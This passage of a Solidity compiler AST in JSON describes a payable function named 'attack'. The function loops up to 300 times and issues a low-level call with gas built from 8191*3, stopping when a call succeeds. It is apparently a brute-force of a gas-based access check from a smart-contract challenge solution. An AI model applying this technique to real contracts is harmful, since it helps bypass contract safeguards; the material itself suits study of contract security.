																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"hexValue": "38313931",
																							"id": 515,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "1617:4:1",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_8191_by_1",
																								"typeString": "int_const 8191"
																							},
																							"value": "8191"
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "*",
																						"rightExpression": {
																							"argumentTypes": null,
																							"hexValue": "33",
																							"id": 516,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "1624:1:1",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_3_by_1",
																								"typeString": "int_const 3"
																							},
																							"value": "3"
																						},
																						"src": "1617:8:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_24573_by_1",
																							"typeString": "int_const 24573"
																						}
																					}
																				],
																				"id": 518,
																				"isConstant": false,
																				"isInlineArray": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "TupleExpression",
																				"src": "1616:10:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_24573_by_1",
																					"typeString": "int_const 24573"
																				}
																			},
																			"src": "1612:14:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"src": "1586:41:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$gas",
																		"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
																	}
																},
																"id": 526,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1586:88:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
																	"typeString": "tuple(bool,bytes memory)"
																}
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "1567:107:1"
														},
														{
															"condition": {
																"argumentTypes": null,
																"id": 528,
																"name": "success",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 508,
																"src": "1692:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 531,
															"nodeType": "IfStatement",
															"src": "1688:51:1",
															"trueBody": {
																"id": 530,
																"nodeType": "Block",
																"src": "1701:38:1",
																"statements": [
																	{
																		"id": 529,
																		"nodeType": "Break",
																		"src": "1719:5:1"
																	}
																]
															}
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 503,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 501,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 498,
														"src": "1539:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "333030",
														"id": 502,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1543:3:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_300_by_1",
															"typeString": "int_const 300"
														},
														"value": "300"
													},
													"src": "1539:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 533,
												"initializationExpression": {
													"assignments": [
														498
													],
													"declarations": [
														{
															"constant": false,
															"id": 498,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 533,
															"src": "1524:9:1",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 497,
																"name": "uint256",
																"nodeType": "ElementaryTypeName",
																"src": "1524:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 500,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 499,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1536:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "1524:13:1"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 505,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "1548:3:1",
														"subExpression": {
															"argumentTypes": null,
															"id": 504,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 498,
															"src": "1548:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 506,
													"nodeType": "ExpressionStatement",
													"src": "1548:3:1"
												},
												"nodeType": "ForStatement",
												"src": "1519:230:1"
											}
										]
									},
									"documentation": null,
									"functionSelector": "9e5faafc",
									"id": 535,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attack",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 482,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1422:2:1"
									},
									"returnParameters": {
										"id": 483,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1440:0:1"
									},
									"scope": 536,
									"src": "1407:357:1",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 537,
							"src": "1281:490:1"
						}
					],
					"src": "32:1739:1"
				},
				"id": 1
			}
		}
	}
}